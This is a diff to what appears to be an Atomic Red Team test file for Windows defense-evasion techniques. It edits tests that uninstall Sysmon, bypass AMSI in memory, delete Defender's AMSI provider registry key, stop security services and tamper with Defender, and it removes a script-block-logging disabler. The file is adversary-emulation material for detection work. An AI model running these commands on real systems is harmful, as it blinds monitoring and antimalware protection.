@@ -170,7 +170,7 @@ atomic_tests:
 
 - name: Uninstall Sysmon
   description: |
-    Uninstall Sysinternals Sysmon for Defense Evasion
+    Uninstall Sysinternals Sysmon for Defense Evasion. Upon execution,
   supported_platforms:
     - windows
 
@@ -178,26 +178,25 @@ atomic_tests:
     sysmon_exe:
       description: The location of the Sysmon executable from Sysinternals (ignored if sysmon.exe is found in your PATH)
       type: Path
-      default: PathToAtomicsFolder\T1089\bin\sysmon.exe
+      default: Test-Path $env:Temp\Sysmon\Sysmon.exe
 
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      Sysmon executable must be available
+      Sysmon must be downloaded
     prereq_command: |
-      if(cmd /c where sysmon) {exit 0} else {exit 1}
+      if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") -or (Test-Path #{sysmon_exe})) { exit 0 } else { exit 1 }
     get_prereq_command: |
-      $parentpath = Split-Path "#{sysmon_exe}"; $zippath = "$parentpath\Sysmon.zip"
-      New-Item -ItemType Directory $parentpath -Force | Out-Null
-      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$zippath"
-      Expand-Archive $zippath $parentpath -Force; Remove-Item $zippath
-      if(-not ($Env:Path).contains($parentpath)){$Env:Path += ";$parentpath"}
+      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
+      Expand-Archive $env:TEMP\Sysmon.zip $env:TEMP\Sysmon -Force
+      Remove-Item $env:TEMP\Sysmon.zip -Force
   - description: |
-      Sysmon must be installed
+      sysmon must be Installed
     prereq_command: |
-      if(cmd /c sc query sysmon) { exit 0} else { exit 1}
+      if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }
     get_prereq_command: |
-      cmd /c sysmon -i -accepteula
+      if(cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else
+      { Set-Location $env:TEMP\Sysmon\; .\Sysmon.exe -accepteula -i}
 
   executor:
     name: command_prompt
@@ -210,6 +209,8 @@ atomic_tests:
 - name: AMSI Bypass - AMSI InitFailed
   description: |
     Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
+    Upon execution, no output is displayed.
+
     https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
   supported_platforms:
     - windows
@@ -219,12 +220,13 @@ atomic_tests:
     command: |
       [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     cleanup_command: |
-      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false) -ErrorAction Ignore
+      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
 
 - name: AMSI Bypass - Remove AMSI Provider Reg Key
   description: |
     With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
-    This test removes the Windows Defender provider registry key.
+    This test removes the Windows Defender provider registry key. Upon execution, no output is displayed.
+    Open Registry Editor and navigate to "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\" to verify that it is gone.
   supported_platforms:
     - windows
   executor:
@@ -232,12 +234,14 @@ atomic_tests:
     elevation_required: true
     command: |
        Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
-    cleanup_command: | 
+    cleanup_command: |
        New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}" -ErrorAction Ignore | Out-Null
 
 - name: Disable Arbitrary Security Windows Service
   description: |
-    With administrative rights, an adversary can disable Windows Services related to security products.
+    With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.
+    Change the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.
+    To verify that the service has stopped, run "sc query McAfeeDLPAgentService"
   supported_platforms:
     - windows
   input_arguments:
@@ -254,40 +258,6 @@ atomic_tests:
     cleanup_command: |
        sc.exe config #{service_name} start= auto >nul 2>&1
        net.exe start #{service_name} >nul 2>&1
-
-- name: Disable PowerShell Script Block Logging
-  description: |
-    An adversary may disable PowerShell Script Block Logging to avoid leaving evidence.
-
-    Credit to Matt Graeber (@mattifestation) for the research.
-  supported_platforms:
-    - windows
-  executor:
-    name: powershell
-    elevation_required: false
-    command: |
-      $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
-      $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
-      $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
-      $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
-    cleanup_command: |
-      $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
-      $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
-      $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 1
-      $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 1
-
-- name: PowerShell Bypass of AntiMalware Scripting Interface
-  description: |
-    An adversary may bypass Windows Defender AMSI to execute malicious PowerShell code.
-
-    Credit to Matt Graeber (@mattifestation) for the research.
-  supported_platforms:
-    - windows
-  executor:
-    name: powershell
-    elevation_required: false
-    command: |
-      [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 - name: Tamper with Windows Defender ATP PowerShell
   description: |
@@ -312,7 +282,8 @@ atomic_tests:
 - name: Tamper with Windows Defender Command Prompt
   description: |
     Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.
-    However, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on.
+    However, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, "Access Denied"
+    will be displayed twice and the WinDefend service status will be displayed.
   supported_platforms:
     - windows
   executor:
@@ -343,7 +314,7 @@ atomic_tests:
 - name: Disable Microft Office Security Features
   description: |
     Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not
-    show any warning before editing the document
+    show any warning before editing the document.
 
 
     https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
